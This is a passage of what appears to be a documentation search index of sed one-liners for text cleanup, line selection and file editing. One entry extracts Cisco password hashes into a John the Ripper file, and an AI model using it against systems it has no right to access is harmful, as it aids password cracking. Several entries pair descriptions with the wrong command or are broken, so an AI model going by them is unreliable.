\"|\"} { $2 = $2 - 600; $3 = $3 - 600; print $0 }' | sed -e 's/^|/{/' -e 's/\\([0-9]\\)|\\([0-9]\\)/\\1}{\\2/' -e 's/|/}/' > MySQL: Slice out a specific table from the output of mysqldump sed -n \"/^ Table structure for table \\`departments\\`/,/^ Table structure for table/p\" Comment out all lines in a file beginning with string sed -i 's/^\\(somestring\\)/#\\1/' somefile.cfg commentate specified line of a file sed -i '<line_no>s/\\(.*\\)/#\\1/' <testfile> Remove multiple spaces sed \"s/^ *//;s/ * $ //;s/ \\{1,\\}/ /g\" filename.txt Simple Comment an entire file sed -i 's/^/#/' FILENAME Convert a Python interactive session to a python script sed 's/^\\([^>.]\\)/#\\1/;s/^>>> //;s/^\\.\\.\\./ /' Add a line from 1 file after every line of another (shuffle files together) sed '/^/R addfile' targetfile > savefile print contents of file from first match of regex to end of file sed -n '/regex/,$p' filename Compute the numeric sum of a file sed i \"+\" file.txt | xargs echo 0 | bc Delete leading whitespace from the start of each line sed 's/^[ \\t]*//' input.txt Delete leading whitespace from the start of each line sed 's/^\\s*//' input.txt Search apache virtual host by pattern sed -n '/^[^#]*<Virtual/{:l N; /<\\/Virtual/!bl;}; /PATTERN/p' vhosts.conf Terminal - Show directories in the PATH, one per line with sed and bash3.X `here string' sed 's/:/\\n/g' <<< $PATH Remove a range of lines from a file sed -i <start>,<end>d <filename> Every Nth line position # (SED) sed -n '1,${p;n;n;}' foo > foo_every3_position1 ; sed -n '2,${p;n;n;}' foo > foo_every3_position2 ; sed -n '3,${p;n;n;}' foo > foo_every3_position3 In-Place search/replace with datestamped backup sed -i. ` date +%Y%m%d ` -e 's/pattern/replace' [ filename ] Replace spaces in a file with hyphens sed -i 's/ /-/g' * Delete the specified line sed -i 8d ~/.ssh/known_hosts Change host name sed -i 's/oldname/newname/' /etc/hosts /etc/hostname Print just line 4 from a textfile sed -n '4{p;q}' Print just line 4 from a textfile sed -n '4p' Cleanup a (source) text file, removing trailing spaces/tabs and multiple consecutive blank lines sed -i -e 's/[ \\t]*$//;/^$/N;/\\n$/D' sourcefiletocleanup Put uppercase letters in curly brackets in a BibTeX database sed '/^\\s*[^@%]/s=\\([A-Z][A-Z]*\\)\\([^}A-Z]\\|},$\\)={\\1}\\2=g' literature.bib > output.bib Prepend a text to a file. sed -i 's/^/ls -l /' output_files.txt Edit Ruby files within the current directory to use Ruby 1.9+ style symbol keys instead of rockets sed -i \"s/:\\([a-zA-Z_]*\\) =>/\\1:/g\" **/*.rb uncomment the lines where the word DEBUG is found sed 's/^#\\(.*DEBUG\\)/\\1/' $FILE Raspberry Pi serial number w/o leading zeros sed '$!d s/.*: 0\\+//' /proc/cpuinfo Remove color codes (special characters) with sed sed -r \"s/(\\x1B|\\033)(\\(B|\\[([0-9]{1,2}(;[0-9]{1,2})?)?[A-Z])//Ig\" urldecoding sed -e 's/%\\([0-9A-F][0-9A-F]\\)/\\\\\\\\\\x\\1/g' | xargs echo -e Remove color codes (special characters) with sed sed -r 's/' $( echo -e \"\\033\" ) '\\[[0-9]{1,2}(;([0-9]{1,2})?)?[mK]//g' Replace words with sed sed /BEGIN/,/END/s/xxx/yyy/g input.txt Rebuild a Delimited File with a Unique Delimiter sed 's/$/uniqueString/' file.old | sed 's/,/\\n/g' | sed ':loop;/^\\\"[^\\\"]*$/N;s/\\n/,/;/[^\\\"]$/t loop' | sed ':loop;N;s/\\n/@/g;/uniqueString$/!b loop;s/uniqueString$//' > file.new delete all trailing whitespace from each line in file sed 's/[ \\t]*$//' < <file> > <file>.out ; mv <file>.out <file> delete all leading and trailing whitespace from each line in file sed 's/^[ \\t]*//;s/[ \\t]*$//' < <file> > <file>.out ; mv <file>.out <file> Remove r (carriage return) in a file sed -i ' s/ \\r //g somefile.txt delete all leading and trailing whitespace from each line in file sed 's/^\\s*//;s/\\s*$//' -i file Puts every word from a file into a new line sed -r 's/[ \\t\\r\\n\\v\\f]+/\\^J/g' INFILE > OUTFILE Change your e-mail address in multiple files sed -i 's/oldname@example.com/newname@example.com/g' ` grep oldname@example.com -rl . ` Delete all lines after the first match sed -n -e '1,/match/p' Extract ip addresses with sed sed -n 's/.*\\(\\(\\(^\\| \\)[0-9]\\{1,3\\}\\.\\)\\{1\\}\\([0-9]\\{1,3\\}\\.\\)\\{2\\}[0-9]\\{1,3\\}\\) .*/\\1/gp' sed replace string in whole files in folder sed -i 's/SearchString/ReplaceString/g' views/*.php bash chop sed 's/.$//' Printout a list of field numbers from a CSV file with headers as first line. sed 's/,/\\n/g;q' file.csv | nl Remove lines that contain a specific pattern( \\(1) from file(\\) 2). sed -i '/myexpression/d' /path/to/file.txt Convert Windows/DOS Text Files to Unix sed -i 's/\\r//' <filename> insert blank lines sed G input.txt | cat -s Removes lines [range] from file sed '1,5d' /path/to/file more than 4 repeated characters to a single character sed -ru 's/(.)\\1{4,}/\\1/g' Convert camelCase to underscores (camel_case) sed -r 's/([a-z]+)([A-Z][a-z]+)/\\1_\\l\\2/g' file.txt Tells which group you DON'T belong to (opposite of command \"groups\") - uses sed sed -e \"/ $USER /d;s/:.*//g\" /etc/group | sed -e :a -e '/$/N;s/\\n/ /;ta' Remove blank lines from a file sed -i.bak '/^[[:space:]]*$/d' file_name Convert ISO8601 dates to milliseconds since epoch sed \"s|\\(2[0-9]\\{3\\}-[01][0-9]-[0-3][0-9]T[01][0-9]:[0-5][0-9]:[0-5][0-9].[0-9]\\{3\\}Z\\)| $( date -d \\1 +%s ) 000|g\" Go to the Nth line of file sed -n '15p' $file MySQL: Slice out a specific database (assumes existence of the USE statement) from mysqldump output sed -n \"/^USE \\`employees\\`/,/^USE \\`/p\" Remove color codes (special characters) with sed sed -r \"s@\\^\\[{1,2}([0-9]{1,2}(;[0-9]{1,2})?(;[0-9])?(m|K){1,2})?@@g\" Only change the first occurrence of the pattern sed -i \"0,/enabled/{s|enabled=0|enabled=1|}\" /etc/yum.repos.d/remi.repo Remove the first line containing 'match' from file sed -i \" $( grep -nm 1 match file | cut -f1 -d: ) d\" file replace deprecated php-function split in php files sed -i s/split \\( /explode \\( / whatever.php File without comments or blank lines. sed 's/^[[:blank:]]*//; s/^#.*//; /^$/d' filename Comment out all lines in a file beginning with string sed -i '/^somestring/ s/^/#/' somefile.cfg Remove color codes (special characters) with sed sed -r \"s/\\x1B\\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g\" Replace strings in files sed -i -e 's/war/peace/g' * pick up 3 lines start at every 5 th line of file.txt sed -n '1~5{N;N;p}' file.txt Regular expression search pattern to remove the Datetime and Name when you paste from skype chat into your text editor sed -i 's/^.*?].*?:\\s//g' skype-chat-log.txt Analyze Apache Web Log Statistics starting on DATE x sed -n '/05\\/Dec\\/2010/,$ p' access.log | goaccess -s -b Duplicate a line in a text file and replace part of the duplicated line sed -i -e '/foo/p' -e 's/foo/barfoo/' file Format a password file for John the Ripper from Cisco configs (Level 5) sed -n 's/[ :]/_/g; s/^\\(.\\{1,\\}\\)_5_\\($1$[$./0-9A-Za-z]\\{27,31\\}\\)_*$/\\1:\\2/p' < cisco-device-config > passwd HTML esacaping with sed sed 's/&/\\&amp;/g; s/</\\&lt;/g; s/>/\\&gt;/g; s/\"/\\&quot;/g; s/' \"'\" '/\\&#39;/g' Parse bookmarks and download youtube files sed 's+href=\"\\([^\"]*\\)\"+\\n\\1\\n+g' bookmarks.html | grep '^http' | clive Remove color codes (special characters) with sed sed -E \"s/\" $'\\E' \"\\[([0-9]{1,3}((;[0-9]{1,3})*)?)?[m|K]//g\" Extract specific lines from a text file using Stream Editor (sed) sed -n -e 1186 ,1210p A-small-practice.in Insert line(s) at top of file using sed sed -i '1iI am a new line' file.txt Extract XML from an otherwise plain text log file sed -n '/<Tag>/,/<\\/Tag>/p' logfile.log List the CPU model name sed -n 's/^model name[ \\t]*: *//p' /proc/cpuinfo Edit hosts file to remove \"foo.novalocal\" from it where foo is the hostname of a new VM sed -e \"s/^127.0.1.1 $( hostname ) .novalocal/127.0.1.1/g\" /etc/hosts convert html links into plain text with link anchor sed 's!<[Aa] *href*=*\"\\([^\"]*\\)\"*>\\([^<>]*\\)</[Aa]>!\\1,\\2!g' links.html delete first and last line from file sed '1d;$d' filename Remove comments from files sed -i -e '/^#[^!].*/d' -e 's/\\(.*[^!]\\)#.*[^}]/\\1/' <filename> Sort a one-per-line list of email address, weeding out duplicates sed 's/[ \\t]*$//' < emails.txt | tr 'A-Z' 'a-z' | sort | uniq > emails_sorted.txt Join lines split with backslash at the end sed -e '/\\\\$/{:0;N;s/\\\\\\n//;t0}' Cut everything until last slash sed 's:..*/::' echo \" ${ var ##*/ } \" # Colorize sed outpu printf 'my ERROR color' | sed s/ERROR/ ` printf \"\\033[32mERROR\\033[0m\" ` / Remove all space before a line sed 'NUMq;d' Print only NUM line sed -e 's/^[ \\t]*//' Remove all leading and trailing whitespace from end of each line sed 's/^[ \\t]*//;s/[ \\t]*$//' Print everything after / sed 's:.*/::' Print everything after stalled sed -n -e 's/^.*stalled: //p' Cut all spaces infront of all words sed -e 's/^[ \\t]*//' Make space very 3 word echo \"Youcaneasilydothisbyhighlightingyourcode.\" | sed 's/\\(.\\{3\\}\\)/\\1 /g' Cut after every third line printf 'Line 1\\nLine 2\\nLine 3\\nLine 4\\nLine 5\\n' | sed '$!N;$!N;s/\\n/ /g' Print with tabular head -4 /etc/passwd | tr : , | sed -e 's/^/| /' -e 's/,/,| /g' -e 's/$/,|/' | column -t -s, Resources https://fabianlee.org/2018/10/28/linux-using-sed-to-insert-lines-before-or-after-a-match/","title":"sed"},{"location":"linux/sed/#sed","text":"Stream Editor for filtering and transforming text, really handy one-liners for SED","title":"sed"},{"location":"linux/sed/#insert-a-new-string-above-and-below-matched-string","text":"echo netstat | sed 's/netstat.*/```sh \\n&\\n```/g' > netstat.md","title":"Insert a new string above and below matched string"},{"location":"linux/sed/#insert-a-new-string-above-and-below-matched-string_1","text":"echo \"hello world\" | sed 's/world/\\n&/g' hello world","title":"Insert a new string above and below matched string"},{"location":"linux/sed/#insert-a-new-string-above-and-below-matched-string_2","text":"sed \"s/regexp/\\\\`echo -e '\\n\\r'`/g\" ```` ### Method 4: Make a new line after every comma ',' ``` sh echo one,two,three | sed 's/,/\\ /g' one two three Method 4: echo pattern | sed -E -e $'s/^(pattern)/\\\\\\n\\\\1/' pattern","title":"Insert a new string above and below matched string"},{"location":"linux/sed/#insert-a-new-string-above-and-below-matched-string_3","text":"echo 'foobar' | sed -r 's/(bar)/\\n\\1/;'","title":"Insert a new string above and below matched string"},{"location":"linux/sed/#add-sh-above-curl-good-for-writiing-wikis-for-example","text":"echo \" curl\" | sed 's/ curl/```sh\\n&/;s/$/\\n```/g' curl","title":"Add '''sh above curl, good for writiing wikis for example"},{"location":"linux/sed/#replace-2-words-with-sans-escaping","text":"echo \"Hello World\" | sed 's/\\(Hello\\)/World\\1/g' World Hello","title":"Replace 2 words with sans escaping"},{"location":"linux/sed/#double-space-a-file","text":"sed G","title":"Double space a file"},{"location":"linux/sed/#double-space-a-file-which-already-has-blank-lines-in-it","text":"Output fileshould contain no more than one blank line between lines of text. sed '/^$/d;G'","title":"Double space a file which already has blank lines in it."},{"location":"linux/sed/#triple-space-a-file","text":"sed 'G;G'","title":"Triple space a file"},{"location":"linux/sed/#undo-double-spacing-assumes-even-numbered-lines-are-always-blank","text":"sed 'n;d'","title":"Undo double-spacing (assumes even-numbered lines are always blank)"},{"location":"linux/sed/#number-each-line-of-a-file-simple-left-alignment","text":"","title":"Number each line of a file (simple left alignment)."},{"location":"linux/sed/#using-a-tab-see-note-on-t-at-end-of-file-instead-of-space-will-preserve-margins","text":"sed = filename | sed 'N;s/\\n/\\t/'","title":"Using a tab (see note on 't' at end of file) instead of space will preserve margins."},{"location":"linux/sed/#number-each-line-of-a-file-number-on-left-right-aligned","text":"sed = filename | sed 'N; s/^/ /; s/ *\\(.\\{6,\\}\\)\\n/\\1 /'","title":"Number each line of a file (number on left, right-aligned)"},{"location":"linux/sed/#number-each-line-of-file-but-only-print-numbers-if-line-is-not-blank","text":"sed '/./=' filename | sed '/./N; s/\\n/ /'","title":"Number each line of file, but only print numbers if line is not blank"},{"location":"linux/sed/#count-lines-emulates-wc--l","text":"sed -n '$='","title":"Count lines (emulates \"wc -l\")"},{"location":"linux/sed/#delete-leading-whitespace-spaces-tabs-from-front-of-each-line-aligns-all-text-flush-left","text":"see note on 't' at end of file sed 's/^[ \\t]*//'","title":"Delete leading whitespace (spaces, tabs) from front of each line aligns all text flush left"},{"location":"linux/sed/#delete-trailing-whitespace-spaces-tabs-from-end-of-each-line","text":"sed 's/[ \\t]*$//' # see note on '\\t' at end of file","title":"delete trailing whitespace (spaces, tabs) from end of each line"},{"location":"linux/sed/#delete-both-leading-and-trailing-whitespace-from-each-line","text":"sed 's/^[ \\t]*//;s/[ \\t]*$//'","title":"Delete BOTH leading and trailing whitespace from each line"},{"location":"linux/sed/#insert-5-blank-spaces-at-beginning-of-each-line-make-page-offset","text":"sed 's/^/ /'","title":"Insert 5 blank spaces at beginning of each line (make page offset)"},{"location":"linux/sed/#align-all-text-flush-right-on-a-79-column-width-set-at-78-plus-1-space","text":"sed -e :a -e 's/^.\\{1,78\\}$/ &/;ta'","title":"Align all text flush right on a 79-column width, set at 78 plus 1 space"},{"location":"linux/sed/#center-all-text-in-the-middle-of-79-column-width","text":"In method 1, spaces at the beginning of the line are significant, and trailing spaces are appended at the end of the line. In method 2, spaces at the beginning of the line are discarded in centering the line, and no trailing spaces appear at the end of lines. Method 1 sed -e :a -e 's/^.\\{1,77\\}$/ & /;ta' Method 2 sed -e :a -e 's/^.\\{1,77\\}$/ &/;ta' -e 's/\\( *\\)\\1/\\1/'","title":"Center all text in the middle of 79-column width."},{"location":"linux/sed/#replaces-only-1st-instance-in-a-line","text":"sed 's/foo/bar/'","title":"Replaces only 1st instance in a line"},{"location":"linux/sed/#replaces-only-4th-instance-in-a-line","text":"sed 's/foo/bar/4'","title":"Replaces only 4th instance in a line"},{"location":"linux/sed/#replaces-all-instances-in-a-line","text":"sed 's/foo/bar/g'","title":"Replaces ALL instances in a line"},{"location":"linux/sed/#replace-the-next-to-last-case","text":"sed 's/\\(.*\\)foo\\(.*foo\\)/\\1bar\\2/'","title":"Replace the next-to-last case"},{"location":"linux/sed/#replace-only-the-last-case","text":"sed 's/\\(.*\\)foo/\\1bar/'","title":"Replace only the last case"},{"location":"linux/sed/#substitute-foo-with-bar-only-for-lines-which-contain-baz","text":"sed '/baz/s/foo/bar/g'","title":"Substitute \"foo\" with \"bar\" ONLY for lines which contain \"baz\""},{"location":"linux/sed/#substitute-foo-with-bar-except-for-lines-which-contain-baz","text":"sed '/baz/!s/foo/bar/g'","title":"Substitute \"foo\" with \"bar\" EXCEPT for lines which contain \"baz\""},{"location":"linux/sed/#change-scarlet-or-ruby-or-puce-to-red","text":"Most seds sed 's/scarlet/red/g;s/ruby/red/g;s/puce/red/g' GNU sed only gsed 's/scarlet\\|ruby\\|puce/red/g'","title":"Change \"scarlet\" or \"ruby\" or \"puce\" to \"red\""},{"location":"linux/sed/#reverse-order-of-lines-emulates-tac-bugfeature-in-hhsed-v15-causes-blank-lines-to-be-deleted","text":"Method 1 sed '1!G;h;$!d' Method 2 sed -n '1!G;h;$p'","title":"Reverse order of lines (emulates \"tac\") bug/feature in HHsed v1.5 causes blank lines to be deleted"},{"location":"linux/sed/#reverse-each-character-on-the-line-emulates-rev","text":"sed '/\\n/!G;s/\\(.\\)\\(.*\\n\\)/&\\2\\1/;//D;s/.//'","title":"Reverse each character on the line (emulates \"rev\")"},{"location":"linux/sed/#join-pairs-of-lines-side-by-side-like-paste","text":"sed '$!N;s/\\n/ /'","title":"Join pairs of lines side-by-side (like \"paste\")"},{"location":"linux/sed/#if-a-line-ends-with-a-backslash-append-the-next-line-to-it","text":"sed -e :a -e '/\\\\$/N; s/\\\\\\n//; ta'","title":"If a line ends with a backslash, append the next line to it"},{"location":"linux/sed/#if-a-line-begins-with-an-equal-sign-append-it-to-the-previous-line-and-replace-the--with-a-single-space","text":"sed -e :a -e '$!N;s/\\n=/ /;ta' -e 'P;D'","title":"If a line begins with an equal sign, append it to the previous line and replace the \"=\" with a single space"},{"location":"linux/sed/#add-commas-to-numeric-strings-changing-1234567-to-1234567","text":"GNU sed only sh gsed ':a;s/\\B[0-9]\\{3\\}\\>/,&/;ta' Other seds sed -e :a -e 's/\\(.*[0-9]\\)\\([0-9]\\{3\\}\\)/\\1,\\2/;ta'","title":"Add commas to numeric strings, changing \"1234567\" to \"1,234,567\""},{"location":"linux/sed/#add-commas-to-numbers-with-decimal-points-and-minus-signs-gnu-sed","text":"gsed ':a;s/ \\(^\\|[^0-9.]\\) \\([0-9]\\+\\) \\([0-9]\\{3\\}\\) /12,3/g;ta' ### Add a blank line every 5 lines (after lines 5, 10, 15, 20, etc.) * GNU sed only ```sh gsed '0~5G' Other seds sed 'n;n;n;n;G;'","title":"Add commas to numbers with decimal points and minus signs (GNU sed)"},{"location":"linux/sed/#print-first-10-lines-of-file-emulates-behavior-of-head","text":"sed 10q","title":"Print first 10 lines of file (emulates behavior of \"head\")"},{"location":"linux/sed/#print-first-line-of-file-emulates-head--1","text":"sed q","title":"Print first line of file (emulates \"head -1\")"},{"location":"linux/sed/#print-the-last-10-lines-of-a-file-emulates-tail","text":"sed -e :a -e '$q;N;11,$D;ba'","title":"Print the last 10 lines of a file (emulates \"tail\")"},{"location":"linux/sed/#print-the-last-2-lines-of-a-file-emulates-tail--2","text":"sed '$!N;$!D'","title":"Print the last 2 lines of a file (emulates \"tail -2\")"},{"location":"linux/sed/#print-the-last-line-of-a-file-emulates-tail--1","text":"Method 1 sed '$!d' Method 2 sed -n '$p'","title":"Print the last line of a file (emulates \"tail -1\")"},{"location":"linux/sed/#print-only-lines-which-match-regular-expression-emulates-grep","text":"Method 1 sed -n '/regexp/p' Method 2 sed '/regexp/!d'","title":"Print only lines which match regular expression (emulates \"grep\")"},{"location":"linux/sed/#print-only-lines-which-do-not-match-regexp-emulates-grep--v","text":"Method 1 sed -n '/regexp/!p' Method 2 sed '/regexp/d'","title":"Print only lines which do NOT match regexp (emulates \"grep -v\")"},{"location":"linux/sed/#print-the-line-immediately-before-a-regexp-but-not-the-line-ccontaining-the-regexp","text":"sed -n '/regexp/{g;1!p;};h'","title":"Print the line immediately before a regexp, but not the line ccontaining the regexp"},{"location":"linux/sed/#print-the-line-immediately-after-a-regexp-but-not-the-line-containing-the-regexp","text":"sed -n '/regexp/{n;p;}'","title":"Print the line immediately after a regexp, but not the line containing the regexp"},{"location":"linux/sed/#print-1-line-of-context-before-and-after-regexp-with-line-number-indicating-where-the-regexp-occurred-similar-to-grep--a1--b1","text":"sed -n -e '/regexp/{=;x;1!p;g;$!N;p;D;}' -e h","title":"Print 1 line of context before and after regexp, with line number indicating where the regexp occurred (similar to \"grep -A1 -B1\")"},{"location":"linux/sed/#grep-for-aaa-and-bbb-and-ccc-in-any-order","text":"sed '/AAA/!d; /BBB/!d; /CCC/!d'","title":"Grep for AAA and BBB and CCC (in any order)"},{"location":"linux/sed/#grep-for-aaa-and-bbb-and-ccc-in-that-order","text":"sed '/AAA.*BBB.*CCC/!d'","title":"Grep for AAA and BBB and CCC (in that order)"},{"location":"linux/sed/#grep-for-aaa-or-bbb-or-ccc-emulates-egrep","text":"Other seds sed -e '/AAA/b' -e '/BBB/b' -e '/CCC/b' -e d GNU sed only gsed '/AAA\\|BBB\\|CCC/!d'","title":"Grep for AAA or BBB or CCC (emulates \"egrep\")"},{"location":"linux/sed/#print-paragraph-if-it-contains-aaa-blank-lines-separate-paragraphs-sed-v15-must-insert-a-g-after-x-in-the-next-3-scripts-below","text":"sed -e '/./{H;$!d;}' -e 'x;/AAA/!d;'","title":"Print paragraph if it contains AAA (blank lines separate paragraphs) sed v1.5 must insert a 'G;' after 'x;' in the next 3 scripts below"},{"location":"linux/sed/#print-paragraph-if-it-contains-aaa-and-bbb-and-ccc-in-any-order","text":"sed -e '/./{H;$!d;}' -e 'x;/AAA/!d;/BBB/!d;/CCC/!d'","title":"Print paragraph if it contains AAA and BBB and CCC (in any order)"},{"location":"linux/sed/#print-paragraph-if-it-contains-aaa-or-bbb-or-ccc","text":"sed -e '/./{H;$!d;}' -e 'x;/AAA/b' -e '/BBB/b' -e '/CCC/b' -e d GNU Sed only gsed '/./{H;$!d;};x;/AAA\\|BBB\\|CCC/b;d'","title":"Print paragraph if it contains AAA or BBB or CCC"},{"location":"linux/sed/#print-only-lines-of-65-characters-or-longer","text":"sed -n '/^.\\{65\\}/p'","title":"Print only lines of 65 characters or longer"},{"location":"linux/sed/#print-only-lines-of-less-than-65-characters","text":"Method 1 sed -n '/^.\\{65\\}/!p' Method 2 sed '/^.\\{65\\}/d'","title":"Print only lines of less than 65 characters"},{"location":"linux/sed/#print-section-of-file-from-regular-expression-to-end-of-file","text":"sed -n '/regexp/,$p'","title":"Print section of file from regular expression to end of file"},{"location":"linux/sed/#print-section-of-file-based-on-line-numbers-lines-8-12-inclusive","text":"Method 1 sed -n '8,12p' Method 2 sed '8,12!d'","title":"Print section of file based on line numbers (lines 8-12, inclusive)"},{"location":"linux/sed/#print-line-number-52","text":"Method 1 sed -n '52p' Method 2 sed '52!d' Method 3 sed '52q;d'","title":"Print line number 52"},{"location":"linux/sed/#beginning-at-line-3-print-every-7th-line","text":"GNU Sed only gsed -n '3~7p' Other seds sed -n '3,${p;n;n;n;n;n;n;}'","title":"Beginning at line 3, print every 7th line"},{"location":"linux/sed/#print-section-of-file-between-two-regular-expressions-inclusive","text":"sed -n '/Iowa/,/Montana/p'","title":"Print section of file between two regular expressions (inclusive)"},{"location":"linux/sed/#print-all-of-file-except-section-between-2-regular-expressions","text":"sed '/Iowa/,/Montana/d'","title":"Print all of file EXCEPT section between 2 regular expressions"},{"location":"linux/sed/#delete-duplicate-consecutive-lines-from-a-file-emulates-uniq","text":"First line in a set of duplicate lines is kept, rest are deleted. sed '$!N; /^\\(.*\\)\\n\\1$/!P; D'","title":"Delete duplicate, consecutive lines from a file (emulates \"uniq\")."},{"location":"linux/sed/#delete-duplicate-nonconsecutive-lines-from-a-file","text":"Beware not to overflow the buffer size of the hold space, or else use GNU sed. sh sed -n 'G; s/\\n/&&/; /^\\([ -~]*\\n\\).*\\n\\1/d; s/\\n//; h; P'","title":"Delete duplicate, nonconsecutive lines from a file."},{"location":"linux/sed/#delete-the-first-10-lines-of-a-file","text":"sed '1,10d'","title":"Delete the first 10 lines of a file"},{"location":"linux/sed/#delete-the-last-line-of-a-file","text":"sed '$d'","title":"Delete the last line of a file"},{"location":"linux/sed/#delete-the-last-2-lines-of-a-file","text":"sed 'N;$!P;$!D;$d'","title":"Delete the last 2 lines of a file"},{"location":"linux/sed/#dlete-the-last-10-lines-of-a-file","text":"Method 1 sed -e :a -e '$d;N;2,10ba' -e 'P;D' Method 2 sed -n -e :a -e '1,10!{P;N;D;};N;ba'","title":"Dlete the last 10 lines of a file"},{"location":"linux/sed/#delete-every-8th-line","text":"GNU sed only gsed '0~8d' Other seds sed 'n;n;n;n;n;n;n;d;'","title":"Delete every 8th line"},{"location":"linux/sed/#delete-all-blank-lines-from-a-file-same-as-grep--","text":"Method 1 sed '/^$/d' Method 2 sed '/./!d'","title":"Delete ALL blank lines from a file (same as \"grep '.' \")"},{"location":"linux/sed/#delete-all-consecutive-blank-lines-from-file-except-the-first-also-deletes-all-blank-lines-from-top-and-end-of-file-emulates-cat--s","text":"Method 1 sed '/./,/^$/!d' Method 2 sed '/^$/N;/\\n$/D'","title":"Delete all CONSECUTIVE blank lines from file except the first; also deletes all blank lines from top and end of file (emulates \"cat -s\")"},{"location":"linux/sed/#delete-all-consecutive-blank-lines-from-file-except-the-first-2","text":"sed '/^$/N;/\\n$/N;//D'","title":"Delete all CONSECUTIVE blank lines from file except the first 2:"},{"location":"linux/sed/#delete-all-leading-blank-lines-at-top-of-file","text":"sed '/./,$!d'","title":"Delete all leading blank lines at top of file"},{"location":"linux/sed/#delete-all-trailing-blank-lines-at-end-of-file","text":"sed -e :a -e '/^\\n*$/N;/\\n$/ba'","title":"Delete all trailing blank lines at end of file"},{"location":"linux/sed/#delete-the-last-line-of-each-paragraph","text":"sed -n '/^$/{p;h;};/./{x;/./p;}'","title":"Delete the last line of each paragraph"},{"location":"linux/sed/#deletes-everything-after-first-blank-line","text":"sed '/^$/q'","title":"Deletes everything after first blank line"},{"location":"linux/sed/#deletes-everything-up-to-first-blank-line","text":"sed '1,/^$/d'","title":"Deletes everything up to first blank line"},{"location":"linux/sed/#get-subject-header-but-remove-initial-subject--portion","text":"sed '/^Subject: */!d; s///;q'","title":"Get Subject header, but remove initial \"Subject: \" portion"},{"location":"linux/sed/#get-return-address-header","text":"sed '/^Reply-To:/q; /^From:/h; /./d;g;q'","title":"Get return address header"},{"location":"linux/sed/#parse-out-the-address-proper","text":"Pulls out the e-mail address by itself from the 1-line return address header (see preceding script) sed 's/ *(.*)//; s/>.*//; s/.*[:<] *//'","title":"Parse out the address proper."},{"location":"linux/sed/#add-a-leading-angle-bracket-and-space-to-each-line-quote-a-message","text":"sed 's/^/> /'","title":"Add a leading angle bracket and space to each line (quote a message)"},{"location":"linux/sed/#delete-leading-angle-bracket--space-from-each-line-unquote-a-message","text":"sed 's/^> //' ### Remove most HTML tags (accommodates multiple-line tags) ``` sh sed -e :a -e 's/<[^>]*>//g;/</N;//ba'","title":"Delete leading angle bracket &amp; space from each line (unquote a message)"},{"location":"linux/sed/#add-one-blank-line-between-all-of-them-with-sed","text":"sed -i '0~1 a\\\\'","title":"Add one blank line between all of them with sed"},{"location":"linux/sed/#inserts-one-line-every-3-rows","text":"sed -i '0~3 a\\\\'","title":"Inserts one line every 3 rows."},{"location":"linux/sed/#method-2-inserts-one-line-every-3-rows","text":"sed -i 'G;G;G'","title":"Method 2: Inserts one line every 3 rows."},{"location":"linux/sed/#method-3-inserts-one-line-after-every-string-and-at-end-make-2-empty-lines","text":"sed ':a;G;s/n/&/1;Ta'","title":"Method 3: Inserts one line after every string and at end, make 2 empty lines"},{"location":"linux/sed/#uppercasing-first-letter-of-words-using-sed","text":"echo -e \"wuseman\" | sed -r 's/\\<./\\U&/g'","title":"Uppercasing First Letter of Words Using SED"},{"location":"linux/sed/#colorize-a-word","text":"echo START|sed ''/START/s//`printf \"\\033[32mSTART\\033[0m\"`/''","title":"Colorize a word"},{"location":"linux/sed/#to-print-a-specific-line-from-a-file","text":"sed -n 5p <file>","title":"To print a specific line from a file"},{"location":"linux/sed/#uncomment-the-lines-where-the-word-debug-is-found","text":"sed '/^#.*DEBUG.*/ s/^#//' $FILE","title":"uncomment the lines where the word DEBUG is found"},{"location":"linux/sed/#convert-a-line-to-a-space","text":"sed 's/.*/ /'","title":"convert a line to a space"},{"location":"linux/sed/#find-which-lines-in-a-file-are-longer-than-n-characters","text":"sed -n \"/^.\\{73,\\}/p\" < /path/to/file","title":"find which lines in a file are longer than N characters"},{"location":"linux/sed/#easy-way-to-display-yum-repo-priorities","text":"sed -n -e \"/^\\[/h; /priority *=/{ G; s/\\n/ /; s/ity=/ity = /; p }\" /etc/yum.repos.d/*.repo | sort -k3n","title":"Easy way to display yum repo priorities"},{"location":"linux/sed/#get-your-speed-dial-urls","text":"sed -n '/url/s#^.*url=\\(.*://.*\\)#\\1#p' ~/.mozilla/firefox/*. [ dD ] efault/SDBackups/*.speeddial | sort | uniq","title":"Get your Speed Dial urls"},{"location":"linux/sed/#search-and-replace-pipes-for-tabs-in-file-with-backup","text":"sed -i.bak -e s/ \\| / \\\\ t/g filepath.tsv","title":"Search and replace pipes for tabs in file with backup"},{"location":"linux/sed/#removereplace-newline-characters","text":"sed ':a;N;$!ba;s/\\n/ /g'","title":"Remove/replace newline characters."},{"location":"linux/sed/#append-the-line-----coding-utf-8----to-a-file","text":"sed -i -e '1i \\# -*- coding: utf-8 -*-' yourfile.py","title":"Append the line # -- coding: utf-8 -- to a file"},{"location":"linux/sed/#append-a-new-line-foobar-in-all-files-matching-the-glob","text":"sed -i '$a\\FOOBAR' *","title":"Append a new line \"FOOBAR\" in all files matching the glob*"},{"location":"linux/sed/#simply-clean-playlist","text":"sed -e '/MP3$\\|mp3$\\|wma$\\|flac$/!d' <filename_source> > <filename_destination>","title":"Simply clean playlist"},{"location":"linux/sed/#delete-all-leading-whitespace-from-each-line-in-file","text":"sed 's/^[ \\t]*//' < <file> > <file>.out ; mv <file>.out <file>","title":"delete all leading whitespace from each line in file"},{"location":"linux/sed/#sed-file-spacing","text":"sed G","title":"Sed file spacing"},{"location":"linux/sed/#convert-an-unix-file-to-a-dos-file","text":"sed -i 's/$/\\r/' file","title":"Convert an UNIX file to a DOS file."},{"location":"linux/sed/#truncate-files-without-output-redirection-or-temporary-file-creation","text":"sed -i 's/`head -n 500 foo.log`//' foo.log","title":"truncate files without output redirection or temporary file creation"},{"location":"linux/sed/#sed--using-colons-as-separators-instead-of-forward-slashes","text":"sed \"s:/old/direcory/:/new/directory/:\" <file>","title":"sed : using colons as separators instead of forward slashes"},{"location":"linux/sed/#delete-a-particular-line-by-line-number-in-file","text":"sed -i 3d ~/.ssh/known_hosts","title":"delete a particular line by line number in file"},{"location":"linux/sed/#convert-windows-text-file-to-linux-text-document","text":"sed 's/.$//' Win-file.txt","title":"Convert windows text file to linux text document"},{"location":"linux/sed/#reverse-dns-lookups","text":"sed 's/\\([0-9]*\\)\\.\\([0-9]*\\)\\.\\([0-9]*\\)\\.\\([0-9]*\\).in-addr.arpa domain name pointer\\(.*\\)\\./\\4.\\3.\\2.\\1\\5/' \\ lookups.txt","title":"Reverse DNS 